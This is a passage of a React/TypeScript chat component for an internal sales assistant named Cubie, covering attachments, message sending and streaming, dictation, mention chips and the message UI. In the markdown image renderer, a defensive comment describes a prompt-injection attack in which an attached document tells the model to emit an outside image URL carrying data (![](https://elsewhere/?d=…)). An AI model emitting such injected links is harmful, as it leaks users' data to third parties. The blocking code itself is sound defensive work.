        setMessages(prev => prev.map(m => (m.id === assistantId ? finalMessage : m)));
        chimeIfLong((Date.now() - startedAt) / 1000);
        if (done.hubspot_data || done.generated_sql) {
            setSelectedLogMessage(finalMessage);
        }
        return true;
    };

    const updatePending = (localId: string, patch: Partial<PendingAttachment>) =>
        setPendingFiles(prev => prev.map(p => (p.localId === localId ? { ...p, ...patch } : p)));

    // Read each picked file on the server straight away, so the person sees
    // what Cubie made of it (and any refusal) before they send.
    const addFiles = (files: File[]) => {
        if (!canAttach || files.length === 0) return;
        const room = MAX_FILES_PER_MESSAGE - pendingFiles.filter(p => p.status !== 'error').length;
        const picked = files.slice(0, Math.max(room, 0));
        const sessionAtPick = activeSessionId;
        const entries: PendingAttachment[] = picked.map(file => ({
            localId: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
            name: file.name || 'pasted-image.png',
            size: file.size,
            status: 'reading',
            controller: new AbortController(),
        }));
        const skipped = files.length - picked.length;
        if (skipped > 0) {
            entries.push({
                localId: `${Date.now()}-skipped`,
                name: `${skipped} more file${skipped === 1 ? '' : 's'}`,
                size: 0,
                status: 'error',
                error: `Attach up to ${MAX_FILES_PER_MESSAGE} files per message.`,
            });
        }
        setPendingFiles(prev => [...prev, ...entries]);
        picked.forEach((file, i) => {
            const entry = entries[i];
            if (file.size > MAX_FILE_BYTES) {
                updatePending(entry.localId, {
                    status: 'error',
                    error: `That file is larger than ${MAX_FILE_BYTES / 1_000_000} MB. Attach a smaller one.`,
                    controller: undefined,
                });
                return;
            }
            const named = file.name ? file : new File([file], entry.name, { type: file.type });
            attachFile(named, sessionAtPick, entry.controller?.signal)
                .then(f => updatePending(entry.localId, { status: 'ready', file: f, controller: undefined }))
                .catch(err => {
                    if (entry.controller?.signal.aborted) return; // removed while reading
                    updatePending(entry.localId, { status: 'error', error: uploadErrorMessage(err), controller: undefined });
                });
        });
    };

    // Removing a chip before sending takes a NEW file back out of the person's
    // private library; a file they had attached before (reused) stays.
    const removePending = (localId: string) => {
        const item = pendingFiles.find(p => p.localId === localId);
        item?.controller?.abort();
        const f = item?.file;
        const stillUsed = pendingFiles.some(p => p.localId !== localId && p.file?.id === f?.id);
        if (f && !f.reused && !stillUsed) void deleteChatFile(f.id).catch(() => { /* listed in Assets */ });
        setPendingFiles(prev => prev.filter(p => p.localId !== localId));
    };

    const handleSend = async (presetText?: string, opts?: { fromDictation?: boolean }) => {
        // The mic is the send button while it is busy (see voiceBusy).
        if (voiceBusyRef.current && !opts?.fromDictation) return;
        // presetText is supplied when a suggestion chip is clicked; otherwise
        // read the live contentEditable input.
        const plainTextInput = (
            presetText ?? (inputRef.current ? extractTextForBackend(inputRef.current) : input)
        ).trim();
        // A file still being read holds the message: it would go without it.
        if (isLoading || filesReading) return;
        const attachmentRefs: ChatAttachmentRef[] = [];
        for (const p of pendingFiles) {
            const f = p.status === 'ready' ? p.file : undefined;
            if (!f || attachmentRefs.some(r => r.id === f.id)) continue;
            attachmentRefs.push({ id: f.id, filename: f.filename, kind: f.kind, size_bytes: f.size_bytes });
        }
        if (!plainTextInput && attachmentRefs.length === 0) return;
        const attachmentIds = attachmentRefs.map(r => r.id);

        const userMessage: Message = {
            role: 'user',
            content: plainTextInput,
            id: Date.now().toString(),
            attachments: attachmentRefs.length ? attachmentRefs : undefined,
        };

        setMessages(prev => [...prev, userMessage]);
        
        // Clear inputs
        setInput('');
        if (inputRef.current) {
            inputRef.current.innerHTML = '';
        }
        setMentionQuery(null);
        setSlashQuery(null);
        setPendingFiles([]);
        setIsLoading(true);

        // Unlock audio within this user gesture so a long-prompt completion chime
        // can play later (browsers block audio started outside a gesture). UAT-09.
        if (chimeEnabled) ensureAudioContext();
        const startedAt = Date.now();

        // Fresh AbortController for this turn so the Stop button can cancel it.
        const controller = new AbortController();
        abortControllerRef.current = controller;

        try {
            // Build history from current messages for context
            const history = messages.map(m => ({ role: m.role, content: m.content }));

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Streaming is the DEFAULT; one browser opts out with
            // CHAT_STREAMING_KEY === '0' (brand/storage.ts). If streaming is
            // disabled server-side (endpoint 404s), streamAssistantReply returns
            // false and we fall through to the buffered request below.
            if (readChatStreamingPref()) {
                const handled = await streamAssistantReply(userMessage.content, history, timezone, controller.signal, startedAt, attachmentIds);
                if (handled) return; // finally{} still runs (clears loading + abort controller)
                // streaming unavailable server-side → fall through to buffered path
            }

            const { data } = await client.post('/api/chat/', {
                query: userMessage.content,
                session_id: activeSessionId,
                history, // Backend might ignore if session_id is provided, but good for backward compat
                timezone,
                attachment_ids: attachmentIds,
            }, { signal: controller.signal });

            if (!activeSessionId && data.session_id) {
                setActiveSessionId(data.session_id);
                await fetchSessions(); // Await refresh list to show new session
            }

            // Track request ID for debugging
            if (data.request_id) {
                setLastRequestId(data.request_id);
            }

            const assistantMessage: Message = {
                role: 'assistant',
                content: data.answer,
                citations: data.citations,
                hubspot_data: data.hubspot_data,
                generated_sql: data.generated_sql,
                debug: data.debug,
                id: (Date.now() + 1).toString(),
                dbId: data.message_id,
                confirmation: data.confirmation ?? undefined,
            };

            setMessages(prev => [...prev, assistantMessage]);

            // UAT-09: ding once the answer lands, but only if the user waited a while.
            chimeIfLong((Date.now() - startedAt) / 1000);

            // Auto-open logs if there's HubSpot data or SQL to show it's working
            if (data.hubspot_data || data.generated_sql) {
                setSelectedLogMessage(assistantMessage);
            }
        } catch (error: any) {
            // User pressed Stop — this is an intentional cancel, not an error.
            // Show a neutral note and skip the red error / log panel entirely.
            if (error.code === 'ERR_CANCELED' || error.name === 'CanceledError' || error.name === 'AbortError') {
                const stoppedMessage: Message = {
                    role: 'assistant',
                    content: '_Response stopped._',
                    id: (Date.now() + 1).toString(),
                };
                setMessages(prev => [...prev, stoppedMessage]);
                return;
            }
            console.error("Chat error:", error);
            const status = error.response?.status;
            const isTimeout = error.code === 'ECONNABORTED' || error.message?.includes('timeout');
            let errorDetail = error.response?.data?.detail || error.message || "Unknown error";
            let content = "I'm sorry, I encountered an error. Please check the logs for details.";

            if (isTimeout) {
                // The client timeout (105s) sits ABOVE the backend's 90s wall-clock,
                // so reaching here means the backend never answered at all (cold
                // start / infra stall) — not a normal slow query, which instead
                // returns a graceful in-band "timed out after 90s" message.
                content = "The request timed out. The AI might be under heavy load — please try again in a moment.";
                errorDetail = `No response after 105 seconds.${lastRequestId ? ` Request ID: ${lastRequestId}` : ''}`;
            } else if (status === 401) {
                content = "Your session has expired. Please refresh the page or log in again.";
                errorDetail = "401 Unauthorized: Session invalid or expired.";
            } else if (status === 429) {
                content = "The AI model is currently busy. Please try again in a moment.";
            }

            const errorMessage: Message = {
                role: 'assistant',
                content: content,
                error_details: errorDetail,
                id: (Date.now() + 1).toString()
            };
            setMessages(prev => [...prev, errorMessage]);
            setSelectedLogMessage(errorMessage);
            // Don't auto-open for 401 as the message itself explains it
            if (status !== 401) {
                setIsLogPanelOpen(true);
            }
        } finally {
            setIsLoading(false);
            abortControllerRef.current = null;
        }
    };

    // Voice input. Stopping the mic yourself (its button or Enter) sends the
    // words straight away, after anything already typed. They are left in the
    // box instead, with a line saying why, when the stop was not a decision
    // to send: the two-minute limit ended it, the person moved to another
    // conversation or edited the box while it was being written down, or an
    // answer is still on its way.
    const handleVoiceBusy = useCallback((busy: boolean) => {
        voiceBusyRef.current = busy;
        setVoiceBusy(busy);
    }, []);

    // Runs inside the click or Enter that stops the mic, so it is a gesture.
    const handleVoiceStop = () => {
        if (chimeEnabled) ensureAudioContext();
        dictationContextRef.current = {
            epoch: conversationEpochRef.current,
            box: inputRef.current?.innerHTML ?? '',
        };
    };

    // An open @mention or #channel list owns Enter and Escape.
    const voiceKeyClaimed = () =>
        (mentionQuery !== null && mentionResults.length > 0)
        || (channelQuery !== null && channelResults.length > 0)
        || (slashOpen && slashResults.length > 0);

    const handleDictation = (text: string, { reason }: DictationInfo): string | void => {
        const el = inputRef.current;
        if (!el) return;
        const atStop = dictationContextRef.current;
        dictationContextRef.current = null;
        const movedOn = atStop !== null
            && (atStop.epoch !== conversationEpochRef.current || atStop.box !== el.innerHTML);
        if (!appendToEditable(el, text)) return;
        setInput(el.innerHTML);
        if (reason === 'limit') {
            return "That's the two-minute limit, so your words are in the box. Press Send when you're ready.";
        }
        if (movedOn) {
            return 'Things changed while Cubie was writing it down, so your words are in the box. Press Send to ask it.';
        }
        if (isLoading) {
            return "Cubie is still answering, so your words are in the box. Press Send when it's done.";
        }
        if (filesReading) {
            return 'Cubie is still reading your file, so your words are in the box. Press Send when it is ready.';
        }
        void handleSend(undefined, { fromDictation: true });
    };

    // Cancel the in-flight chat request (Stop button). The abort surfaces as a
    // CanceledError in handleSend's catch, which renders a neutral "stopped" note.
    const handleStop = () => {
        abortControllerRef.current?.abort();
    };

    const handleInput = (e: React.FormEvent<HTMLDivElement>) => {
        const target = e.currentTarget;
        setInput(target.innerHTML);

        const whole = (target.textContent || '').replace(/\u00A0/g, ' ');
        const slash = canUseSkills ? whole.match(/^\s*\/([a-z0-9-]*)$/i) : null;
        setSlashQuery(slash ? slash[1].toLowerCase() : null);
        if (slash) setSlashIndex(0);

        const selection = window.getSelection();
        if (!selection || selection.rangeCount === 0) {
            setMentionQuery(null);
            setChannelQuery(null);
            return;
        }

        const range = selection.getRangeAt(0);
        const node = range.endContainer;

        if (node.nodeType === Node.TEXT_NODE) {
            const textContent = node.textContent || '';
            const textBeforeCursor = textContent.slice(0, range.endOffset);
            const mentionMatch = textBeforeCursor.match(/@([a-zA-Z0-9_\-\.]*)$/);
            const channelMatch = textBeforeCursor.match(/#([a-zA-Z0-9_\-]*)$/);
            if (mentionMatch) {
                setMentionQuery(mentionMatch[1]);
                setChannelQuery(null);
            } else if (channelMatch) {
                setChannelQuery(channelMatch[1]);
                setMentionQuery(null);
            } else {
                setMentionQuery(null);
                setChannelQuery(null);
            }
        } else {
            setMentionQuery(null);
            setChannelQuery(null);
        }
    };

    const handleSlashSelect = (entry: { slug: string }) => {
        const el = inputRef.current;
        if (!el) return;
        el.textContent = `/${entry.slug} `;
        // Caret to the end, so they can name the meeting straight away.
        const range = document.createRange();
        range.selectNodeContents(el);
        range.collapse(false);
        const selection = window.getSelection();
        selection?.removeAllRanges();
        selection?.addRange(range);
        el.focus();
        setInput(el.innerHTML);
        setSlashQuery(null);
    };

    const handleChannelSelect = (channel: any) => {
        const selection = window.getSelection();
        if (!selection || !selection.rangeCount || !inputRef.current) return;

        const range = selection.getRangeAt(0);
        const node = range.endContainer;
        if (node.nodeType !== Node.TEXT_NODE) return;

        const textContent = node.textContent || '';
        const textBeforeCursor = textContent.slice(0, range.endOffset);
        const match = textBeforeCursor.match(/#([a-zA-Z0-9_\-]*)$/);
        if (!match) return;

        const name = channel.name || '';
        const channelId = channel.id || '';

        // Remove the #query the user typed
        range.setStart(node, match.index!);
        range.setEnd(node, range.endOffset);
        range.deleteContents();

        // Insert a styled chip — extractTextForBackend serializes it to "#name"
        // so the LLM tools see the channel handle exactly as typed.
        const chip = document.createElement('span');
        chip.contentEditable = 'false';
        chip.className = 'channel-chip bg-ink text-brand-soft px-2 py-0.5 rounded text-sm inline-flex items-center gap-1 mx-1 cursor-pointer select-none align-middle font-medium border border-brand/50 hover:bg-brand-hover/60 transition-colors';
        chip.dataset.channel = 'true';
        chip.dataset.channelId = channelId;
        chip.dataset.channelName = name;
        chip.innerText = `#${name}`;

        range.insertNode(chip);

        const spaceNode = document.createTextNode(' ');
        chip.after(spaceNode);
        range.setStartAfter(spaceNode);
        range.setEndAfter(spaceNode);
        selection.removeAllRanges();
        selection.addRange(range);

        setChannelQuery(null);
        if (inputRef.current) {
            setInput(inputRef.current.innerHTML);
        }
    };

    const handleMentionSelect = (userItem: any) => {
        const selection = window.getSelection();
        if (!selection || !selection.rangeCount || !inputRef.current) return;

        const range = selection.getRangeAt(0);
        const node = range.endContainer;

        if (node.nodeType === Node.TEXT_NODE) {
            const textContent = node.textContent || '';
            const textBeforeCursor = textContent.slice(0, range.endOffset);
            const match = textBeforeCursor.match(/@([a-zA-Z0-9_\-\.]*)$/);
            
            if (match) {
                const email = userItem.primaryEmail || userItem.emails?.[0]?.address;
                const name = userItem.name?.fullName || email;
                const profilePic = userItem.thumbnailPhotoUrl || '';
                const position = userItem.organizations?.[0]?.title || 'Employee';

                // Remove the @query text
                range.setStart(node, match.index!);
                range.setEnd(node, range.endOffset);
                range.deleteContents();

                // Create the rich chip span
                const chip = document.createElement('span');
                chip.contentEditable = "false";
                chip.className = "mention-chip bg-[#1e4a66] text-[#73c2fb] px-2 py-0.5 rounded text-sm inline-flex items-center gap-1 mx-1 cursor-pointer select-none align-middle font-medium border border-[#2b668c]/50 hover:bg-[#2b668c] transition-colors";
                chip.dataset.email = email;
                chip.dataset.name = name;
                chip.dataset.position = position;
                chip.dataset.pic = profilePic;
                chip.innerText = `@${name}`;

                chip.dataset.mention = "true";
                chip.dataset.user = JSON.stringify(userItem);

                range.insertNode(chip);


                // Insert a non-breaking space after the chip so the user can continue typing normally
                const spaceNode = document.createTextNode('\u00A0');
                chip.after(spaceNode);

                // Move cursor after the space
                range.setStartAfter(spaceNode);
                range.setEndAfter(spaceNode);
                selection.removeAllRanges();
                selection.addRange(range);
            }
        }

        setMentionQuery(null);
        if (inputRef.current) {
            setInput(inputRef.current.innerHTML);
        }
    };

    const handleKeyDown = (e: React.KeyboardEvent<HTMLDivElement>) => {
        if (mentionQuery !== null && mentionResults.length > 0) {
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                setMentionIndex(prev => (prev + 1) % mentionResults.length);
                return;
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                setMentionIndex(prev => (prev - 1 + mentionResults.length) % mentionResults.length);
                return;
            } else if (e.key === 'Enter' || e.key === 'Tab') {
                e.preventDefault();
                handleMentionSelect(mentionResults[mentionIndex]);
                return;
            } else if (e.key === 'Escape') {
                e.preventDefault();
                setMentionQuery(null);
                return;
            }
        }

        if (channelQuery !== null && channelResults.length > 0) {
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                setChannelIndex(prev => (prev + 1) % channelResults.length);
                return;
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                setChannelIndex(prev => (prev - 1 + channelResults.length) % channelResults.length);
                return;
            } else if (e.key === 'Enter' || e.key === 'Tab') {
                e.preventDefault();
                handleChannelSelect(channelResults[channelIndex]);
                return;
            } else if (e.key === 'Escape') {
                e.preventDefault();
                setChannelQuery(null);
                return;
            }
        }

        if (slashOpen && slashResults.length > 0) {
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                setSlashIndex(prev => (prev + 1) % slashResults.length);
                return;
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                setSlashIndex(prev => (prev - 1 + slashResults.length) % slashResults.length);
                return;
            } else if (e.key === 'Enter' || e.key === 'Tab') {
                e.preventDefault();
                handleSlashSelect(slashResults[Math.min(slashIndex, slashResults.length - 1)]);
                return;
            } else if (e.key === 'Escape') {
                e.preventDefault();
                setSlashQuery(null);
                return;
            }
        }

        // If not handling mention/channel dropdown, Enter sends message
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            handleSend();
        }
    };

    // While an admin impersonates a person, Ask Cubie is a separate HubSpot-only
    // chat that saves nothing (the server refuses the normal chat endpoints).
    if (user?.impersonation) {
        return <ImpersonatedChat targetName={user.impersonation.target_name} />;
    }

    return (
        <div className="flex h-full bg-gray-50 overflow-hidden relative">
            {/* Sidebar (Sessions List) */}
            <motion.aside
                data-tour="chat-history"
                initial={false}
                animate={{
                    width: isSidebarOpen ? 256 : 0,
                    opacity: isSidebarOpen ? 1 : 0
                }}
                className={`flex-shrink-0 bg-gray-900 text-gray-300 flex flex-col absolute inset-y-0 left-0 transform md:relative transition-all duration-300 ease-in-out z-40 overflow-hidden border-r border-gray-800 shadow-2xl`}
            >
                <div className="p-4 bg-gray-950 flex justify-between items-center mt-12 md:mt-0 min-w-[256px]">
                    <span className="font-semibold text-white tracking-wide">Chats</span>
                    <div className="flex items-center gap-2">
                        <button onClick={createFolder} className="text-gray-400 hover:text-white transition group" title="New folder">
                            <FolderPlus size={20} className="group-hover:scale-110 transition-transform" />
                        </button>
                        <button onClick={handleNewChat} className="text-gray-400 hover:text-white transition group" title="New Chat">
                            <PlusCircle size={20} className="group-hover:scale-110 transition-transform" />
                        </button>
                        <button onClick={() => setIsSidebarOpen(false)} className="text-gray-400 hover:text-white md:block hidden" title="Collapse History">
                            <ChevronLeft size={20} />
                        </button>
                    </div>
                </div>
                <div className="flex-1 overflow-y-auto p-2 space-y-1 min-w-[256px] scrollbar-hide">
                    {sessions.length === 0 && folders.length === 0 ? (
                        <div className="text-center text-gray-500 text-sm py-6">No previous chats</div>
                    ) : (
                        <>
                            {/* Folders (UAT-03) */}
                            {folders.map(folder => {
                                const items = sessions.filter(s => s.folder_id === folder.id);
                                const collapsed = collapsedFolders.has(folder.id);
                                // Collapsed is the default state for a folder
                                // you are not working in, so the count has to
                                // survive it — otherwise "Scheduled tasks"
                                // hides exactly the results it just received.
                                const unreadHere = items.filter(s => isUnreadResult(s.id)).length;
                                return (
                                    <div key={folder.id} className="mb-1">
                                        <div
                                            onClick={() => toggleFolderCollapse(folder.id)}
                                            className="group/folder flex items-center gap-1.5 px-2 py-1.5 rounded-md text-xs font-semibold uppercase tracking-wide text-gray-400 hover:bg-gray-800/60 cursor-pointer select-none"
                                        >
                                            {collapsed ? <ChevronRight size={14} className="flex-shrink-0" /> : <ChevronDown size={14} className="flex-shrink-0" />}
                                            {collapsed ? <Folder size={14} className="flex-shrink-0 text-accent" /> : <FolderOpen size={14} className="flex-shrink-0 text-accent" />}
                                            <span className="truncate flex-1 normal-case">{folder.name}</span>
                                            {unreadHere > 0 ? (
                                                <span
                                                    className="rounded-full bg-accent px-1.5 text-[10px] font-semibold leading-[16px] text-gray-900"
                                                    title={`${unreadHere} new ${unreadHere === 1 ? 'result' : 'results'}`}
                                                >
                                                    {unreadHere}
                                                </span>
                                            ) : (
                                                <span className="text-gray-600 font-normal">{items.length}</span>
                                            )}
                                            <button onClick={(e) => renameFolder(e, folder.id, folder.name)} className="opacity-0 group-hover/folder:opacity-100 text-gray-500 hover:text-white transition-all" title="Rename folder">
                                                <Pencil size={12} />
                                            </button>
                                            <button onClick={(e) => deleteFolder(e, folder.id)} className="opacity-0 group-hover/folder:opacity-100 text-gray-500 hover:text-red-400 transition-all" title="Delete folder">
                                                <Trash2 size={12} />
                                            </button>
                                        </div>
                                        {!collapsed && (
                                            <div className="mt-0.5 ml-2 pl-1 border-l border-gray-800 space-y-0.5">
                                                {items.length === 0 ? (
                                                    <div className="px-3 py-1.5 text-gray-600 text-xs italic">Empty — use the folder icon on a chat to add one</div>
                                                ) : items.map(renderSessionRow)}
                                            </div>
                                        )}
                                    </div>
                                );
                            })}

                            {/* Ungrouped chats */}
                            {sessions.filter(s => !s.folder_id).length > 0 && (
                                <div>
                                    {folders.length > 0 && (
                                        <div className="px-2 py-1.5 text-xs font-semibold uppercase tracking-wide text-gray-500">Ungrouped</div>
                                    )}
                                    <div className="space-y-0.5">
                                        {sessions.filter(s => !s.folder_id).map(renderSessionRow)}
                                    </div>
                                </div>
                            )}
                        </>
                    )}
                </div>
            </motion.aside>

            {/* Main Chat Area */}
            <div className="flex-1 flex flex-col h-full bg-gray-50 relative min-w-0">
                <header data-tour="chat-header" className="bg-white border-b border-gray-100 px-6 py-4 flex justify-between items-center">
                    <div className="flex items-center gap-4 flex-1">
                        {!isSidebarOpen && (
                            <button
                                onClick={() => setIsSidebarOpen(true)}
                                className="p-2 hover:bg-gray-100 rounded-md transition-colors text-gray-600 hidden md:block"
                                title="Show History"
                            >
                                <Menu size={20} />
                            </button>
                        )}
                        <div className="max-w-4xl mx-auto w-full">
                            <h2 className="text-lg font-bold text-gray-800 truncate">
                                {activeSessionId ? sessions.find(s => s.id === activeSessionId)?.title || "Your Assistant" : "Your Assistant"}
                            </h2>
                        </div>
                    </div>
                </header>

                <main className="flex-1 overflow-y-auto px-4 py-6 md:px-6">
                    <div className="max-w-4xl mx-auto space-y-6">
                        {/* Empty-state starter prompts */}
                        {messages.length === 0 && !isLoading && (
                            <motion.div
                                initial={{ opacity: 0, y: 10 }}
                                animate={{ opacity: 1, y: 0 }}
                                className="pt-8 md:pt-16"
                            >
                                <div className="flex flex-col items-center text-center mb-8">
                                    <div className="h-12 w-12 rounded-2xl bg-brand text-white flex items-center justify-center mb-4 shadow-sm">
                                        <Sparkles size={24} />
                                    </div>
                                    <h3 className="text-xl font-bold text-gray-800">
                                        {user?.name ? `Hi ${user.name.split(' ')[0]}, how can I help?` : 'How can I help?'}
                                    </h3>
                                    <p className="text-sm text-gray-500 mt-1">Ask me anything, or start with one of these:</p>
                                </div>
                                {rhythmAudience && (() => {
                                    const RhythmIcon = RHYTHM_ICONS[rhythmPart];
                                    return (
                                        <div className="mb-6">
                                            <div className="mb-2 flex flex-wrap items-center justify-between gap-2">
                                                <p className="text-xs font-semibold uppercase tracking-wide text-gray-500">
                                                    {rhythmAudience === 'team' ? 'Your team’s sales rhythm' : 'Your sales rhythm'}
                                                    {' · '}
                                                    {RHYTHM_PART_LABELS[rhythmPart]}
                                                </p>
                                                <div role="tablist" aria-label="Part of the day" className="inline-flex rounded-lg border border-gray-200 bg-white p-0.5">
                                                    {RHYTHM_PARTS.map(p => (
                                                        <button
                                                            key={p}
                                                            type="button"
                                                            role="tab"
                                                            aria-selected={p === rhythmPart}
                                                            onClick={() => setRhythmPart(p)}
                                                            className={`rounded-md px-2.5 py-1 text-xs font-medium transition-colors ${p === rhythmPart ? 'bg-brand text-white' : 'text-gray-600 hover:bg-gray-50'}`}
                                                        >
                                                            {RHYTHM_PART_LABELS[p]}
                                                        </button>
                                                    ))}
                                                </div>
                                            </div>
                                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                                {SALES_RHYTHM_PROMPTS[rhythmAudience][rhythmPart].map(text => (
                                                    <button
                                                        key={`rhythm:${text}`}
                                                        onClick={() => handleSend(text)}
                                                        disabled={voiceBusy}
                                                        className="flex items-start gap-3 text-left p-4 rounded-xl border border-brand/30 bg-white hover:border-brand hover:shadow-sm transition-all group"
                                                    >
                                                        <span className="flex-shrink-0 h-8 w-8 rounded-lg bg-brand/10 text-brand flex items-center justify-center group-hover:bg-brand group-hover:text-white transition-colors">
                                                            <RhythmIcon size={16} />
                                                        </span>
                                                        <span className="text-sm text-gray-700 leading-snug">{text}</span>
                                                    </button>
                                                ))}
                                            </div>
                                        </div>
                                    );
                                })()}
                                <div data-tour="chat-suggestions" className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                    {suggestedPrompts.map(({ groupId, icon, text }) => {
                                        const Icon = SUGGESTION_ICONS[icon];
                                        return (
                                            <button
                                                key={`${groupId}:${text}`}
                                                onClick={() => handleSend(text)}
                                                disabled={voiceBusy}
                                                className="flex items-start gap-3 text-left p-4 rounded-xl border border-gray-200 bg-white hover:border-brand hover:shadow-sm transition-all group"
                                            >
                                                <span className="flex-shrink-0 h-8 w-8 rounded-lg bg-brand/10 text-brand flex items-center justify-center group-hover:bg-brand group-hover:text-white transition-colors">
                                                    <Icon size={16} />
                                                </span>
                                                <span className="text-sm text-gray-700 leading-snug">{text}</span>
                                            </button>
                                        );
                                    })}
                                </div>
                                {/* These cards are a random draw from a much larger set, so the
                                    same reader keeps meeting parts of Cubie they haven't tried.
                                    The link is for anyone who wants to keep looking without
                                    starting a new conversation. */}
                                <div className="flex justify-center mt-3">
                                    <button
                                        type="button"
                                        onClick={() => setPromptSeed(n => n + 1)}
                                        className="inline-flex items-center gap-1.5 text-xs text-gray-500 hover:text-brand transition-colors"
                                        title="Show a different set of starter prompts"
                                    >
                                        <Shuffle size={12} />
                                        Show me other things to ask
                                    </button>
                                </div>
                                {/* Cubie answers questions about itself from the Help page,
                                    so point new users at that rather than leaving them to
                                    hunt through the sidebar. */}
                                <p className="text-xs text-gray-500 text-center mt-6">
                                    New to Cubie? Ask “how do I…” about the app itself — or{' '}
                                    <Link to="/help" className="text-brand hover:underline">
                                        browse the Help page
                                    </Link>
                                    .
                                </p>
                            </motion.div>
                        )}

                        <AnimatePresence>
                            {messages.map((msg) => (
                                <motion.div
                                    key={msg.id}
                                    initial={{ opacity: 0, y: 10 }}
                                    animate={{ opacity: 1, y: 0 }}
                                    className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}
                                >
                                    <div className={`flex max-w-[85%] md:max-w-[75%] ${msg.role === 'user' ? 'flex-row-reverse' : 'flex-row'} items-start gap-3`}>

                                        {/* Avatar */}
                                        <div className={`flex-shrink-0 h-8 w-8 rounded-full flex items-center justify-center mt-1 overflow-hidden ${msg.role === 'user' ? 'bg-brand text-white' : 'bg-brand-hover text-white'
                                            }`}>
                                            {msg.role === 'user' ? (
                                                user?.picture ? (
                                                    <img src={user.picture} alt={user.name || 'User'} className="w-full h-full object-cover" />
                                                ) : (
                                                    <UserIcon size={16} />
                                                )
                                            ) : (
                                                <Bot size={16} />
                                            )}
                                        </div>

                                        {/* Bubble */}
                                        <div className="space-y-2">
                                            <div className={`p-4 rounded-2xl shadow-sm text-sm md:text-base leading-relaxed ${msg.role === 'user'
                                                ? 'bg-brand text-white rounded-tr-sm'
                                                : 'bg-white text-gray-800 border border-gray-100 rounded-tl-sm'
                                                }`}>
                                                {msg.role === 'assistant' && hasConfirmation(msg.confirmation) ? (
                                                    <ConfirmationCard
                                                        confirmation={msg.confirmation}
                                                        // Only the conversation's open question can still be answered.
                                                        onAnswer={messages[messages.length - 1]?.id === msg.id
                                                            ? (answer) => { void handleSend(answer); }
                                                            : undefined}
                                                        disabled={isLoading}
                                                    />
                                                ) : msg.role === 'assistant' ? (
                                                    <div className="prose prose-sm max-w-none prose-headings:font-semibold prose-strong:font-semibold prose-ol:list-decimal prose-ul:list-disc prose-li:my-0.5">
                                                        <ReactMarkdown
                                                            remarkPlugins={[remarkGfm]}
                                                            urlTransform={(url) => {
                                                                // Allow slack:// deep links so the desktop app opens.
                                                                // ReactMarkdown's default sanitizer strips them, which
                                                                // leaves an empty href and the SPA falls back to /chat.
                                                                if (url.startsWith('slack://')) return url;
                                                                return /^(https?:|mailto:|tel:|#|\/)/i.test(url) ? url : '';
                                                            }}
                                                            components={{
                                                                a: ({ node, href, ...props }) => {
                                                                    // In-app links (e.g. the Help section Cubie cites for a
                                                                    // how-to answer, /help#assets) navigate in place — a new
                                                                    // tab would reload the whole SPA to show one section.
                                                                    if (href && href.startsWith('/')) {
                                                                        return (
                                                                            <a
                                                                                {...props}
                                                                                href={href}
                                                                                onClick={(e) => {
                                                                                    e.preventDefault();
                                                                                    navigate(href);
                                                                                }}
                                                                            />
                                                                        );
                                                                    }
                                                                    return <a {...props} href={href} target="_blank" rel="noopener noreferrer" />;
                                                                },
                                                                // Never fetch an outside image the answer names: a
                                                                // document someone attached could tell the model to write
                                                                // ![](https://elsewhere/?d=…) and the browser would send
                                                                // that text away on render. Cubie's own images still show.
                                                                img: ({ src, alt }) => {
                                                                    const url = typeof src === 'string' ? src : '';
                                                                    if (url.startsWith('/') && !url.startsWith('//')) {
                                                                        return <img src={url} alt={alt || ''} className="max-w-full rounded" />;
                                                                    }
                                                                    return url
                                                                        ? <a href={url} target="_blank" rel="noopener noreferrer">{alt || 'Image link'}</a>
                                                                        : null;
                                                                },
                                                            }}
                                                        >
                                                            {msg.content}
                                                        </ReactMarkdown>
                                                    </div>
                                                ) : (
                                                    <>
                                                        {msg.content}
                                                        {msg.attachments && msg.attachments.length > 0 && (
                                                            <MessageAttachments files={msg.attachments} hasText={!!msg.content} />
                                                        )}
                                                    </>
                                                )}
                                                {canSeeDebug && msg.role === 'assistant' && (msg.hubspot_data || msg.generated_sql || msg.error_details || msg.debug) && (
                                                    <div className="mt-3 pt-3 border-t border-gray-100 flex justify-end">
                                                        <button
                                                            onClick={() => {
                                                                setSelectedLogMessage(msg);
                                                                setIsLogPanelOpen(true);
                                                            }}
                                                            className="text-[10px] font-bold uppercase tracking-wider text-brand hover:text-brand-hover flex items-center gap-1"
                                                        >
                                                            View Debug Logs
                                                        </button>
                                                    </div>
                                                )}
                                            </div>

                                            {/* Citations */}
                                            {msg.role === 'assistant' && msg.citations && msg.citations.length > 0 && (
                                                <ChatSources citations={msg.citations} />
                                            )}

                                            {/* WGLL feedback — rate Cubie's answer (only real, saved messages) */}
                                            {msg.role === 'assistant' && msg.dbId && !msg.error_details && (
                                                <div className="px-1">
                                                    <FeedbackButtons
                                                        surface="chat"
                                                        proposalId={msg.dbId}
                                                        proposalText={msg.content}
                                                        proposalMetadata={{ session_id: activeSessionId }}
                                                        initialRating={(chatRatings[msg.dbId]?.rating as FeedbackRating) || null}
                                                        initialComment={chatRatings[msg.dbId]?.comment || null}
                                                    />
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                </motion.div>
                            ))}
                        </AnimatePresence>

                        {isLoading && (
                            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start gap-3">
                                <div className="h-8 w-8 bg-brand-hover rounded-full flex items-center justify-center text-white">
                                    <Bot size={16} />
                                </div>
                                <div className="bg-white p-4 rounded-2xl rounded-tl-sm border border-gray-100 shadow-sm flex items-center space-x-2">
                                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce [animation-delay:0.2s]" />
                                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce [animation-delay:0.4s]" />
                                    <span
                                        className="ml-1.5 inline-flex items-center gap-1 text-xs font-medium text-gray-400 tabular-nums"
